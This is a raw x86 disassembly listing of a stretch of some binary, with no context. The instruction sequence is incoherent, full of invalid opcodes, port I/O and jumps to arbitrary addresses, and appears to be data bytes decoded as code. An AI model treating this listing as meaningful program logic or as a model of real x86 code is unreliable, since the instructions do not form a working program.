  414a1d:	jmp    0x8f82e83e
  414a22:	pop    edi
  414a23:	daa    
  414a24:	pop    ebx
  414a25:	out    dx,eax
  414a26:	or     DWORD PTR [ecx+0x74046537],edx
  414a2c:	mov    WORD PTR [ebx+0x52],ds
  414a2f:	xchg   DWORD PTR [ecx+eax*2-0x1417af5b],edi
  414a36:	and    eax,0x1d0a025f
  414a3b:	add    bl,BYTE PTR [edx]
  414a3d:	int    0xd0
  414a3f:	adc    eax,0xebe6b229
  414a44:	and    al,0x80
  414a46:	inc    esp
  414a47:	cs xchg esi,eax
  414a49:	add    cl,BYTE PTR [ebp+eax*8-0x359c1c9b]
  414a50:	mov    bh,0x47
  414a52:	cmc    
  414a53:	(bad)  
  414a54:	mov    ch,0x48
  414a56:	sbb    eax,0xfe638167
  414a5b:	push   esi
  414a5c:	mov    eax,0x86253185
  414a61:	imul   esi,DWORD PTR [ebp+0x37de56c2],0x18ffcf3c
  414a6b:	add    eax,0x1b62cf2c
  414a70:	mov    edx,0x13726aab
  414a75:	outs   dx,BYTE PTR ds:[esi]
  414a76:	call   0x17d5ac29
  414a7b:	add    DWORD PTR [edi],esi
  414a7d:	imul   edi,DWORD PTR [ebx+0x5],0x5d
  414a81:	std    
  414a82:	mov    dl,0x28
  414a84:	mov    ah,0xda
  414a86:	in     eax,dx
  414a87:	adc    ah,BYTE PTR [ecx+edx*4+0x2f]
  414a8b:	sti    
  414a8c:	push   cs
  414a8d:	sbb    cl,dl
  414a8f:	lahf   
  414a90:	xchg   BYTE PTR [edx+0x64],bh
  414a93:	test   al,0x49
  414a95:	add    bl,ch
  414a97:	bound  esi,QWORD PTR [eax]
  414a99:	shl    DWORD PTR [edx-0x1d],1
  414a9c:	test   eax,0x22e53805
  414aa1:	add    ah,bh
  414aa3:	loopne 0x414a76
  414aa5:	push   esp
  414aa6:	addr16 loopne 0x414a74
  414aa9:	in     al,dx
  414aaa:	ret    0xe82c
  414aad:	dec    ebx
  414aae:	arpl   cx,cx
  414ab0:	rol    DWORD PTR [ecx*4+0xdf99f61],cl
  414ab7:	inc    ebx
  414ab8:	jno    0x414a7e
  414aba:	jmp    0x414a8f
  414abc:	pop    esi
  414abd:	pop    ebx
  414abe:	add    eax,0x5e21acac
  414ac3:	leave  
  414ac4:	sub    ah,BYTE PTR [ebp+ebx*4-0x5e]
  414ac8:	call   0x6b95514f
  414acd:	dec    esp
  414acf:	out    0x40,eax
  414ad1:	retf   
  414ad2:	or     al,0x94
  414ad4:	ins    DWORD PTR es:[edi],dx
  414ad5:	sbb    eax,0xe279709f
  414ada:	push   ebx
  414adb:	mov    al,0xe7
  414add:	sbb    ecx,0x34
  414ae0:	test   BYTE PTR [esi],dh
  414ae2:	mov    ss,WORD PTR [edi+0x25]
  414ae5:	push   esp
  414ae6:	pop    ds
  414ae7:	loop   0x414afc
  414ae9:	mov    dh,0x1a
  414aeb:	retf   0xf652
  414aee:	es stc 
  414af0:	sub    DWORD PTR [edx],eax
  414af2:	ja     0x414b6a
  414af4:	gs shl cl,cl
  414af7:	xor    ah,BYTE PTR [esi+0x1f]
  414afa:	fldenv [esi+0x386b7384]
  414b00:	mov    al,ds:0x769cc695
  414b05:	sub    al,dl
  414b07:	adc    al,al
  414b09:	inc    esi
  414b0a:	cmc    
  414b0b:	das    
  414b0c:	jns    0x414ab0
  414b0e:	or     DWORD PTR [edi],esi
  414b10:	cmp    BYTE PTR [edi+0x17f134ce],al
  414b16:	mov    ebp,0xf8aaca49
  414b1b:	xchg   ebx,eax
  414b1c:	mov    esp,0xe13cb765
  414b21:	repz out dx,eax
  414b23:	ja     0x414ab8
  414b25:	xchg   ebp,eax
  414b26:	adc    edi,DWORD PTR [eax+0x59]
  414b29:	test   eax,0xc6410fa1
  414b2e:	ret    
  414b2f:	sub    edx,DWORD PTR [ebx-0x69]
  414b32:	pop    eax
  414b33:	xor    esp,DWORD PTR [ecx-0x405b254e]
  414b39:	out    dx,al
  414b3a:	call   0xaea8e2a7
  414b3f:	ss inc ecx
  414b41:	mov    bl,0x51
  414b43:	mov    edi,0x67d067da
  414b48:	and    eax,0xa12c6596
  414b4d:	inc    edi
  414b4e:	mov    al,ds:0x6e4ac261
  414b53:	icebp  
  414b54:	mov    ebx,0x29b25e04
  414b59:	xor    eax,0x5111f804
  414b5e:	adc    BYTE PTR [esi+0x47],dl
  414b61:	out    dx,al
  414b62:	out    0x1d,al
  414b64:	cs cld 
  414b66:	sbb    bh,0x3c
  414b69:	std    
  414b6a:	push   ecx
  414b6b:	lods   al,BYTE PTR ds:[esi]
  414b6c:	jmp    0x2d9f3239
  414b71:	or     al,0xe5
  414b73:	dec    edi
  414b74:	adc    edi,edi
  414b76:	ret    
  414b77:	and    DWORD PTR [eax+0x6561fff1],ebx
  414b7d:	jo     0x414bbf
  414b7f:	dec    eax
  414b80:	adc    BYTE PTR ds:0x90b332b7,0x8d
  414b87:	leave  
  414b88:	dec    eax
  414b89:	and    DWORD PTR [eax+ebx*2+0x75],0x127b9369
  414b91:	push   ss
  414b92:	es push eax
  414b94:	das    
  414b95:	(bad)  
  414b97:	add    eax,0x6f473b29
  414b9c:	add    ch,BYTE PTR [eax-0x418547af]
  414ba2:	dec    ecx
  414ba3:	cmp    edx,eax
  414ba5:	mov    ecx,0xf7505b6d
  414baa:	or     cl,cl
  414bac:	sbb    edi,edi
  414bae:	adc    eax,0xa8eccad6
  414bb3:	cmp    cl,BYTE PTR ds:[esi+esi*1+0x122723c4]
  414bbb:	push   esp
  414bbc:	or     bl,ch
  414bbe:	fisub  DWORD PTR [esi]
  414bc0:	ret    
  414bc1:	xchg   edx,eax
  414bc2:	xchg   BYTE PTR [edi-0x2210429c],al
  414bc8:	test   DWORD PTR [ebp-0x164a8c5f],esp
  414bce:	adc    DWORD PTR [edi-0x46],0x5ed3432f
  414bd5:	fdivr  QWORD PTR [eax-0x1f]
  414bd8:	(bad)  
  414bda:	in     eax,0x8f
  414bdc:	mov    DWORD PTR [edi+0x5c10e49b],ecx
  414be2:	js     0x414ba1
  414be4:	push   edi
  414be5:	cwde   
  414be6:	dec    eax
  414be7:	ss jno 0x414c2a
  414bea:	mov    BYTE PTR [edi-0x3d],0xbe
  414bee:	xchg   ebp,eax
  414bef:	(bad)  
  414bf0:	icebp  
  414bf1:	cmc    
  414bf2:	or     al,0x58
  414bf4:	xchg   esi,eax
  414bf5:	arpl   WORD PTR [ebx],dx
  414bf7:	jge    0x414c30
  414bf9:	das    
  414bfa:	dec    edx
  414bfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bfc:	cmp    ch,BYTE PTR [edi]
  414bfe:	int    0xd5
  414c00:	push   ecx
  414c01:	stc    
  414c02:	inc    BYTE PTR [ebp+0xc70db44]
  414c08:	sub    BYTE PTR [eax+0x13],ah
  414c0b:	inc    ecx
  414c0c:	rcr    bl,1
  414c0e:	into   
  414c0f:	fwait
  414c10:	xlat   BYTE PTR ds:[ebx]
  414c11:	mov    esp,0x780e8bca
  414c16:	jmp    0x3326c1a8
  414c1b:	sub    eax,0x1ed519af
  414c20:	cmp    BYTE PTR [ecx-0x5d],cl
  414c23:	in     al,dx
  414c24:	ins    DWORD PTR es:[edi],dx
  414c25:	fs sub edx,eax
  414c28:	fild   WORD PTR ds:[edx-0x5a]
  414c2c:	sub    ch,BYTE PTR [ecx]
  414c2e:	mov    esi,0x4a038400
  414c33:	cld    
  414c34:	out    0x77,eax
  414c36:	pop    ebp
  414c37:	(bad)  
  414c38:	hlt    
  414c39:	je     0x414c8a
  414c3b:	cs xor ah,bl
  414c3e:	rcl    BYTE PTR [eax-0x325c3a2b],0x25
  414c45:	push   ds
  414c46:	push   esp
  414c47:	dec    edx
  414c48:	mov    eax,0x6f161ee5
  414c4d:	mov    WORD PTR [ebx-0x3a],es
  414c50:	mov    ds:0xf9848d44,eax
  414c55:	add    esi,ebx
  414c57:	dec    esp
  414c58:	inc    eax
  414c59:	rol    DWORD PTR [edi+ecx*4],0xd8
  414c5d:	daa    
  414c5e:	test   al,0x44
  414c60:	aad    0x7
  414c62:	and    bh,cl
  414c64:	or     al,0xa1
  414c66:	mov    bh,0xaa
  414c68:	(bad)  
  414c69:	cmp    esp,eax
  414c6b:	lahf   
  414c6c:	lods   eax,DWORD PTR ds:[esi]
  414c6d:	xlat   BYTE PTR ds:[ebx]
  414c6e:	jb     0x414c28
  414c70:	xchg   esi,eax
  414c71:	test   BYTE PTR [ecx+0xc],dh
  414c74:	xor    dl,BYTE PTR [ebx]
  414c76:	stc    
  414c77:	pusha  
  414c78:	mov    fs,WORD PTR [edi+ebx*2+0x1e]
  414c7c:	out    dx,al
  414c7d:	mov    esi,edi
  414c7f:	cmp    al,BYTE PTR [edi-0x6b]
  414c82:	mov    eax,0x65f7eb15
  414c87:	add    DWORD PTR [ebx],esp
  414c89:	fldenv [ecx]
  414c8b:	shl    esp,1
  414c8d:	push   ss
  414c8e:	sub    DWORD PTR [eax-0x664f4960],esi
  414c94:	pop    ebx
  414c95:	add    al,0x7f
  414c97:	mov    esi,0xaf268b80
  414c9c:	sti    
  414c9d:	test   eax,0xa079bfda
  414ca2:	add    DWORD PTR [ecx-0x3bd8e15b],ebp
  414ca8:	jecxz  0x414ca8
  414caa:	push   esi
  414cab:	in     al,dx
  414cac:	mov    edx,0x5848dcb4
  414cb1:	mov    ebx,DWORD PTR [esi+0x35fc308f]
  414cb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cb8:	inc    eax
  414cb9:	mov    ds:0xcc9f2e8f,al
  414cbe:	pusha  
  414cbf:	cld    
  414cc0:	jns    0x414d2d
  414cc2:	mov    al,0x96
  414cc4:	dec    ebx
  414cc5:	repnz leave 
  414cc7:	int    0x78
  414cc9:	fdivr  st,st(5)
  414ccb:	inc    esp
  414ccc:	leave  
  414ccd:	(bad)  
  414cce:	jg     0x414d06
  414cd0:	inc    esi
  414cd1:	jb     0x414d3a
  414cd3:	pop    ecx
  414cd4:	repz mov ebp,0x12e3e216
  414cda:	cmp    dh,cl
  414cdc:	rcr    BYTE PTR [ecx-0x22c91902],1
  414ce2:	sbb    esp,edx
  414ce4:	pop    ss
  414ce5:	test   al,0x9c
  414ce7:	stos   BYTE PTR es:[edi],al
  414ce8:	les    edi,FWORD PTR [eax+eiz*2+0x62]
  414cec:	test   ebx,0x9b16fbce
  414cf2:	adc    edi,edx
  414cf4:	shr    BYTE PTR [ebp-0x30],1
  414cf7:	idiv   DWORD PTR [edx-0x63d3bafb]
  414cfd:	mov    ebx,0xfd23a549
  414d02:	push   ebp
  414d03:	nop
  414d04:	cmp    BYTE PTR [esp+edx*4],al
  414d07:	jne    0x414cdd
  414d09:	pop    edi
  414d0a:	mov    cl,0xb8
  414d0c:	cwde   
  414d0d:	popf   
  414d0e:	jl     0x414d19
  414d10:	cmp    BYTE PTR [ebx],dh
  414d12:	ins    BYTE PTR es:[edi],dx
  414d13:	jns    0x414cc9
  414d15:	cmc    
  414d16:	jl     0x414d68
  414d18:	mov    bh,0x3c
  414d1a:	mov    bl,0x6
  414d1c:	adc    DWORD PTR [ecx],edx
  414d1e:	adc    al,0xe1
  414d20:	and    al,0x63
  414d22:	dec    ebx
  414d23:	dec    ebx
  414d24:	lods   eax,DWORD PTR ds:[esi]
  414d25:	jge    0x414d88
  414d27:	pop    edi
  414d28:	jno    0x414cb9
  414d2a:	pop    ds
  414d2b:	mov    dh,0xe7
  414d2d:	(bad)  
  414d2e:	ja     0x414daf
  414d30:	push   0xfcfe0a0f
  414d35:	in     al,dx
  414d36:	cmc    
  414d37:	in     al,0xd8
  414d39:	mov    esp,?
  414d3b:	cmp    BYTE PTR ds:0x367aefe5,ah
  414d41:	je     0x414d68
  414d43:	xchg   esi,eax
  414d44:	(bad)  
  414d46:	(bad)  
  414d47:	adc    dh,BYTE PTR [eax]
  414d49:	pusha  
  414d4a:	daa    
  414d4b:	not    BYTE PTR [esi+0x2bbfc82a]
  414d51:	imul   eax,DWORD PTR [esi+edi*2],0xa8869926
  414d58:	stos   BYTE PTR es:[edi],al
  414d59:	or     bl,bh
  414d5b:	cdq    
  414d5c:	xlat   BYTE PTR ds:[ebx]
  414d5d:	stos   BYTE PTR es:[edi],al
  414d5e:	add    esi,ecx
  414d60:	push   es
  414d61:	or     ecx,DWORD PTR ds:0x5e785108
  414d67:	and    eax,0xed29f1df
  414d6c:	mov    al,ds:0xe2a04b87
  414d71:	sub    ebx,ebx
  414d73:	mov    ch,0xf9
  414d75:	jo     0x414d34
  414d77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d78:	fadd   QWORD PTR [eax+0x3f889baf]
  414d7e:	clc    
  414d7f:	xchg   ecx,eax
  414d80:	rcr    DWORD PTR [edi+eax*4-0x242a2fe7],0xee
  414d88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d89:	(bad)  
  414d8a:	js     0x414de0
  414d8c:	adc    ch,BYTE PTR [edi]
  414d8e:	cmp    eax,ebx
  414d90:	push   ecx
  414d91:	inc    ecx
  414d92:	in     eax,0x78
  414d94:	inc    esp
  414d95:	out    0x2,al
  414d97:	lea    ecx,[edi]
  414d99:	iret   
  414d9a:	dec    ebp
  414d9b:	add    BYTE PTR [ebx],dl
  414d9d:	push   edx
  414d9e:	ror    bh,1
  414da0:	inc    edi
  414da1:	js     0x414dcd
  414da3:	mov    ch,0x1d
  414da5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414da6:	adc    al,0x8e
  414da8:	mov    bl,0x50
  414daa:	dec    eax
  414dab:	clc    
  414dac:	je     0x414da1
  414dae:	std    
  414daf:	lods   al,BYTE PTR ds:[esi]
  414db0:	sub    cl,BYTE PTR [esi-0x5a]
  414db3:	cmp    DWORD PTR [ebx+0x1bb7395b],ebp
  414db9:	pop    esp
  414dba:	adc    ebp,DWORD PTR [ecx+ecx*1+0x3b]
  414dbe:	sbb    dh,BYTE PTR [esi+0x7b3dea5c]
  414dc4:	push   eax
  414dc5:	xchg   edi,eax
  414dc6:	fidiv  WORD PTR [edx-0x78]
  414dc9:	dec    esi
  414dca:	enter  0x16b5,0xe
  414dce:	stos   BYTE PTR es:[edi],al
  414dcf:	aam    0x52
  414dd1:	pop    ds
  414dd2:	adc    al,0x67
  414dd4:	push   es
  414dd5:	jg     0x414dfa
  414dd7:	jnp    0x414d5c
  414dd9:	pop    ss
  414dda:	iret   
  414ddb:	cmp    DWORD PTR [ebx-0x3e],edi
  414dde:	stc    
  414ddf:	or     ebx,DWORD PTR [ebp-0x25]
  414de2:	cs loope 0x414dde
  414de5:	sbb    eax,0xb455ca1c
  414dea:	in     eax,dx
  414deb:	push   ebp
  414dec:	xchg   edx,eax
  414ded:	rcr    BYTE PTR [ebx+0x51],1
  414df0:	daa    
  414df1:	pop    DWORD PTR [esi+0x34]
  414df4:	ins    DWORD PTR es:[edi],dx
  414df5:	xor    al,0x82
  414df7:	jae    0x414e5a
  414df9:	push   cs
  414dfa:	repz xor al,BYTE PTR [ecx-0x5f]
  414dfe:	stos   BYTE PTR es:[edi],al
  414dff:	jbe    0x414e30
  414e01:	outs   dx,DWORD PTR ds:[esi]
  414e02:	or     eax,0x5381a20c
  414e07:	or     ebp,DWORD PTR [edx]
  414e09:	dec    ebp
  414e0a:	ret    0x9118
  414e0d:	mov    DWORD PTR [edi-0x4c],esp
  414e10:	or     eax,ebp
  414e12:	adc    esi,edx
  414e14:	(bad)  
  414e15:	sbb    ebp,DWORD PTR [ebp+edx*1+0x22ea78c8]
  414e1c:	dec    edi
  414e1d:	or     edi,DWORD PTR [ebx+0x78]
  414e20:	jmp    0xb337:0xd090ce14
  414e27:	jmp    0x414dec
  414e29:	push   eax
  414e2a:	jo     0x414def
  414e2c:	jo     0x414dd5
  414e2e:	dec    ecx
  414e2f:	pop    edi
  414e30:	mov    ds,WORD PTR [eax]
  414e32:	ret    0x498f
  414e35:	popf   
  414e36:	sbb    BYTE PTR [esi+0x45],dh
  414e39:	jge    0x414e1b
  414e3b:	push   ebx
  414e3c:	jo     0x414e1f
  414e3e:	retf   0x4d2b
  414e41:	adc    BYTE PTR [edx],cl
  414e43:	jl     0x414df3
  414e45:	(bad)  
  414e46:	out    dx,al
  414e47:	mov    esp,0xfafc6105
  414e4c:	or     ebp,DWORD PTR [ecx-0x6c303737]
  414e52:	push   edx
  414e53:	mov    al,ds:0x9929e333
  414e58:	jb     0x414def
  414e5a:	jo     0x414e94
  414e5c:	and    BYTE PTR [ebx-0x51],bl
  414e5f:	fwait
  414e60:	test   DWORD PTR [edx+0x7e4b076c],0xf9729203
  414e6a:	fisub  DWORD PTR [eax+0x3f]
  414e6d:	mov    edi,0x6bdf798
  414e72:	dec    esp
  414e73:	fwait
  414e74:	clc    
  414e75:	mov    ds:0x81f75bf2,al
  414e7a:	push   ss
  414e7b:	pop    eax
  414e7c:	sub    cl,ch
  414e7e:	popf   
  414e7f:	ror    BYTE PTR [ebp+0x5e4d656],cl
  414e85:	and    DWORD PTR gs:[ebp+edi*8+0x6184fe8],ecx
  414e8d:	xlat   BYTE PTR ds:[ebx]
  414e8e:	outs   dx,BYTE PTR ds:[esi]
  414e8f:	fiadd  DWORD PTR [eax]
  414e91:	push   esi
  414e92:	and    al,0x77
  414e94:	or     bh,BYTE PTR [esi+0x5d24d017]
  414e9a:	mov    ebp,0x51123996
  414e9f:	mov    al,0x66
  414ea1:	aaa    
  414ea2:	fwait
  414ea3:	push   edx
  414ea4:	sahf   
  414ea5:	add    BYTE PTR [ecx],ch
  414ea7:	inc    ecx
  414ea8:	mov    al,0xaa
  414eaa:	lea    ebp,[esi]
  414eac:	sub    eax,0xa525f194
  414eb1:	nop
  414eb2:	(bad)  
  414eb3:	sub    ah,bl
  414eb5:	test   al,0x69
  414eb7:	mov    ds:0xbceec5eb,eax
  414ebc:	jae    0x414f3c
  414ebe:	jns    0x414eb3
  414ec0:	xor    DWORD PTR [esi+0x390aa390],esp
  414ec6:	pushf  
  414ec7:	mov    esi,0x16b743fc
  414ecc:	es add esi,esp
  414ecf:	mov    ecx,esi
  414ed1:	or     ebp,DWORD PTR gs:[ecx-0x1e217f17]
  414ed8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ed9:	pop    edx
  414eda:	in     al,0xc3
  414edc:	add    BYTE PTR [ecx+0x1bccb83c],bh
  414ee2:	out    dx,eax
  414ee3:	jne    0x414f14
  414ee5:	shr    DWORD PTR [ebp-0x1f30678b],cl
  414eeb:	arpl   cx,bp
  414eed:	loope  0x414f61
  414eef:	pop    edx
  414ef0:	pop    edx
  414ef1:	es int3 
  414ef3:	sbb    DWORD PTR [esi+0x42],eax
  414ef6:	jecxz  0x414f64
  414ef8:	test   BYTE PTR ds:0x8602e0e0,ch
  414efe:	dec    esi
  414eff:	push   0x2a0d21f6
  414f04:	call   0xe05f:0x5b69ed55
  414f0b:	mov    ebx,0xd6468116
  414f10:	adc    eax,0x8d7aef5b
  414f15:	xchg   ebx,eax
  414f16:	sar    DWORD PTR [esi],0xe5
  414f19:	int    0x70
  414f1b:	and    al,BYTE PTR [eax+0xe]
  414f1e:	jecxz  0x414ef9
  414f20:	inc    ebx
  414f21:	xchg   esi,eax
  414f22:	daa    
  414f23:	retf   
  414f24:	test   al,0x1f
  414f26:	xchg   ecx,ecx
  414f28:	add    edx,esp
  414f2a:	xchg   ecx,eax
  414f2b:	ds sbb al,0x78
  414f2e:	or     BYTE PTR [edi-0x786492e5],bl
  414f34:	into   
  414f35:	sbb    al,0x59
  414f37:	cwde   
  414f38:	or     BYTE PTR [esi+0x3c],al
  414f3b:	out    dx,eax
  414f3c:	jg     0x414f98
  414f3e:	ficomp DWORD PTR [edx-0x11dc79a7]
  414f44:	sti    
  414f45:	cmp    esp,DWORD PTR [esi]
  414f47:	mov    ah,0x3
  414f49:	(bad)  
  414f4a:	dec    ebx
  414f4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f4c:	test   eax,0x1262072a
  414f51:	jge    0x414f2c
  414f53:	rcr    DWORD PTR [esi-0x7],0x8b
  414f57:	push   es
  414f58:	clc    
  414f59:	stos   BYTE PTR es:[edi],al
  414f5a:	jne    0x414fa1
  414f5c:	xchg   esi,eax
  414f5d:	inc    ecx
  414f5e:	into   
  414f5f:	dec    eax
  414f60:	xchg   ebp,eax
  414f61:	lds    edx,FWORD PTR [ebx+0x7e]
  414f64:	or     al,0xee
  414f66:	imul   edx,ecx,0xffffffb1
  414f69:	sub    ax,0x4cde
  414f6d:	sub    esi,DWORD PTR cs:[eax]
  414f70:	pop    edx
  414f71:	pushf  
  414f72:	inc    esi
  414f73:	pusha  
  414f74:	(bad)  
  414f75:	or     al,0x63
  414f77:	pop    eax
  414f78:	test   dl,ah
  414f7a:	pusha  
  414f7b:	addr16 icebp 
  414f7d:	cwde   
  414f7e:	xchg   edx,eax
  414f7f:	mov    dl,BYTE PTR [ebp+0x17378dc6]
  414f85:	add    eax,0x521d3850
  414f8a:	or     eax,0xe66a2987
  414f8f:	out    0x14,eax
  414f91:	xor    BYTE PTR [esi+edx*1],0x16
  414f95:	xchg   esi,eax
  414f96:	ins    DWORD PTR es:[edi],dx
  414f97:	mov    ch,0x65
  414f99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f9a:	dec    ebp
  414f9b:	jle    0x414f53
  414f9d:	and    esi,DWORD PTR [esi+0x2fff104b]
  414fa3:	aaa    
  414fa4:	mov    ds:0xfc6d3028,eax
  414fa9:	aam    0x40
  414fab:	dec    edi
  414fac:	clc    
  414fad:	test   BYTE PTR [esp+ebx*8],bh
  414fb0:	push   0x14
  414fb2:	retf   0x8420
  414fb5:	pop    ds
  414fb6:	mov    bl,0x52
  414fb8:	inc    esp
  414fb9:	ficomp DWORD PTR [ecx+0x24a483f2]
  414fbf:	jecxz  0x414ffa
  414fc1:	and    eax,0xbebe35ae
  414fc6:	jp     0x41500b
  414fc8:	jg     0x415009
  414fca:	xchg   edx,eax
  414fcb:	mov    esi,0x826bcae
  414fd0:	xchg   ebp,eax
  414fd1:	xchg   ecx,eax
  414fd2:	add    bh,BYTE PTR [eax-0x42]
  414fd5:	sub    BYTE PTR [eax-0x359a3efb],bl
  414fdb:	add    bh,BYTE PTR [edi+0x1e577b63]
  414fe1:	xor    eax,0x225cba10
  414fe6:	sahf   
  414fe7:	jg     0x414fcc
  414fe9:	add    DWORD PTR [eax-0x41],ebp
  414fec:	out    dx,al
  414fed:	retf   
  414fee:	dec    edi
  414fef:	fadd   DWORD PTR [edi+0x34]
  414ff2:	jbe    0x415008
  414ff4:	or     DWORD PTR [edx],edi
  414ff6:	jmp    0x415008
  414ff8:	add    eax,0xedd7e027
  414ffd:	test   eax,0x7c1d46bf
  415002:	mov    bh,0xb7
  415004:	or     BYTE PTR [edi],ah
  415006:	mov    esp,DWORD PTR [esi+0x3eb61461]
  41500c:	cmp    ebp,DWORD PTR [edx+0xd]
  41500f:	je     0x415078
  415011:	mov    BYTE PTR [esi-0x2c36a7a7],al
  415017:	stos   DWORD PTR es:[edi],eax
  415018:	push   edx
  415019:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41501a:	mov    WORD PTR [edi+edx*2+0x2ec772aa],gs
  415021:	les    esi,FWORD PTR [ebx-0x663788fc]
  415027:	fldenv ds:0x222b862c
  41502d:	xor    al,0x69
  41502f:	popa   
  415030:	mov    esp,0xb31d0ae3
  415035:	adc    al,0xbe
  415037:	push   ebp
  415038:	or     ah,BYTE PTR [edi-0x15]
  41503b:	mov    ds:0xc602f340,al
  415040:	add    ah,BYTE PTR [eax+0x7b]
  415043:	ret    
  415044:	popf   
  415045:	sbb    ebx,DWORD PTR [eax-0x3a309b2]
  41504b:	dec    eax
  41504c:	or     BYTE PTR [esi],bl
  41504e:	mov    esi,0xb03fc9b6
  415053:	stos   DWORD PTR es:[edi],eax
  415054:	mov    bl,0xf6
  415056:	jno    0x415022
  415058:	aas    
  415059:	cmp    bh,BYTE PTR [ecx+0x18bed2ae]
  41505f:	mov    edx,0x4d3f64b4
  415064:	cmp    eax,DWORD PTR [esi]
  415066:	push   eax
  415067:	call   0x52debe48
  41506c:	sbb    al,BYTE PTR [ecx-0x24a1b000]
  415072:	xchg   edx,eax
  415073:	repnz sbb cl,0x11
  415077:	pushf  
  415078:	mov    bl,0xfb
  41507a:	ja     0x415035
  41507c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41507d:	loopne 0x415008
  41507f:	push   0x861afcbd
  415084:	pop    ebp
  415085:	shl    BYTE PTR [ecx],1
  415087:	sub    al,0xfa
  415089:	cli    
  41508a:	or     al,0x35
  41508c:	stos   DWORD PTR es:[edi],eax
  41508d:	test   ebp,esp
  41508f:	aad    0x37
  415091:	gs sbb dh,dh
  415094:	mov    eax,0xae69ea48
  415099:	ja     0x415065
  41509b:	test   DWORD PTR [edi+0x29],0xb8d0923f
  4150a2:	xchg   ebp,ebp
  4150a4:	lock stc 
  4150a6:	shl    BYTE PTR [ebx+eax*2+0x79b93a41],cl
  4150ad:	mov    ebx,0x66da5c8c
  4150b2:	femms  
  4150b4:	inc    eax
  4150b5:	pop    ss
  4150b6:	or     ch,ch
  4150b8:	mov    cl,0xc
  4150ba:	out    dx,al
  4150bb:	in     eax,0x12
  4150bd:	cmp    edx,edx
  4150bf:	add    cl,BYTE PTR [eax+0x36]
  4150c2:	sbb    esp,DWORD PTR [edi-0x43]
  4150c5:	and    al,ah
  4150c7:	pop    edi
  4150c8:	not    BYTE PTR [esi]
  4150ca:	cmp    eax,0xb8752abc
  4150cf:	rcr    dl,0x7b
  4150d2:	pop    eax
  4150d3:	cmp    eax,0x4b35477b
  4150d8:	jp     0x415114
  4150da:	mov    ah,0x25
  4150dc:	xchg   esi,eax
  4150dd:	sar    DWORD PTR [esi-0x28],0xdc
  4150e1:	xor    WORD PTR es:[edi-0x60],dx
  4150e6:	mov    al,0x8f
  4150e8:	bound  esp,QWORD PTR [edx+0x39]
  4150eb:	pop    ebx
  4150ec:	jl     0x41511a
  4150ee:	jo     0x4150a3
  4150f0:	lods   al,BYTE PTR ds:[esi]
  4150f1:	inc    eax
  4150f2:	shr    BYTE PTR [ebx],cl
  4150f4:	mov    eax,ds:0x7dfb92da
  4150f9:	jg     0x4150d1
  4150fb:	lods   eax,DWORD PTR ds:[esi]
  4150fc:	test   DWORD PTR [ebp+0x66],ebx
  4150ff:	mov    ebp,0x95e3fbd9
  415104:	push   cs
  415105:	jg     0x4150ca
  415107:	mov    ds,WORD PTR [ecx+0xed2274e]
  41510d:	(bad)  
  41510e:	fstp   DWORD PTR [ecx]
  415110:	sti    
  415111:	sbb    BYTE PTR [edi-0x61d71e6d],bh
  415117:	mov    al,ds:0x961db710
  41511c:	jo     0x41513c
  41511e:	call   0x15be4640
  415123:	jns    0x415151
  415125:	jne    0x4150f3
  415127:	ins    BYTE PTR es:[edi],dx
  415128:	aaa    
  415129:	iret   
  41512a:	xor    DWORD PTR ds:0x10d3a24b,0xe95bddfb
  415134:	jo     0x4150fe
  415136:	daa    
  415137:	jge    0x41515d
  415139:	out    dx,al
  41513a:	popf   
  41513b:	pop    ss
  41513c:	popa   
  41513d:	fild   DWORD PTR [edi]
  41513f:	arpl   WORD PTR [ebx+0x79e0c1fc],ax
  415145:	jnp    0x4151c6
  415147:	std    
  415148:	into   
  415149:	std    
  41514a:	outs   dx,DWORD PTR ds:[esi]
  41514b:	and    DWORD PTR [edx+ebx*1+0x62],ecx
  41514f:	(bad)  
  415150:	aaa    
  415151:	mov    al,ds:0x8f506d4a
  415156:	inc    ebp
  415157:	push   ebx
  415158:	sbb    al,0xd5
  41515a:	loopne 0x4150e0
  41515c:	pop    esi
  41515d:	sub    al,0xa
  41515f:	lds    edi,FWORD PTR [ebx-0x42b86f59]
  415165:	cmp    BYTE PTR cs:[eax-0x19],cl
  415169:	sbb    al,0x86
  41516b:	lods   eax,DWORD PTR ds:[esi]
  41516c:	lock imul eax,DWORD PTR [edi-0x3719f601],0x14
  415174:	and    al,0xab
  415176:	shr    esi,cl
  415178:	xor    esi,edi
  41517a:	cmp    DWORD PTR [ecx+0x3f722ac8],ebx
  415180:	jecxz  0x415104
  415182:	sbb    edx,0x19
  415185:	push   ecx
  415186:	lods   eax,DWORD PTR ds:[esi]
  415187:	inc    edi
  415188:	outs   dx,BYTE PTR ds:[esi]
  415189:	jmp    0xca99576e
  41518e:	mov    esp,DWORD PTR [edx]
  415190:	fadd   st(7),st
  415192:	sub    cl,BYTE PTR [edx+ebp*8-0x4e]
  415196:	pop    ds
  415197:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415198:	shl    bh,0xee
  41519b:	mov    eax,0xe9a639eb
  4151a0:	inc    ebp
  4151a1:	or     al,0x5e
  4151a3:	sbb    DWORD PTR [eax+eiz*1],ebp
  4151a6:	cs mov ch,0xb
  4151a9:	retf   
  4151aa:	push   ebp
  4151ab:	sbb    esp,DWORD PTR [esi-0x6f]
  4151ae:	outs   dx,BYTE PTR ds:[esi]
  4151af:	and    dl,dh
  4151b1:	xchg   esp,eax
  4151b2:	clc    
  4151b3:	(bad)  
  4151b4:	retf   
  4151b5:	adc    eax,0x159860dc
  4151ba:	inc    edx
  4151bb:	dec    esp
  4151bc:	enter  0x9bc2,0x5e
  4151c0:	xchg   esi,eax
  4151c1:	xchg   esp,eax
  4151c2:	xor    BYTE PTR [di-0x1f6f],ch
  4151c7:	repz scas eax,DWORD PTR es:[edi]
  4151c9:	add    ebp,DWORD PTR [ebx]
  4151cb:	mov    ebp,0x7e9c7c2
  4151d0:	in     al,dx
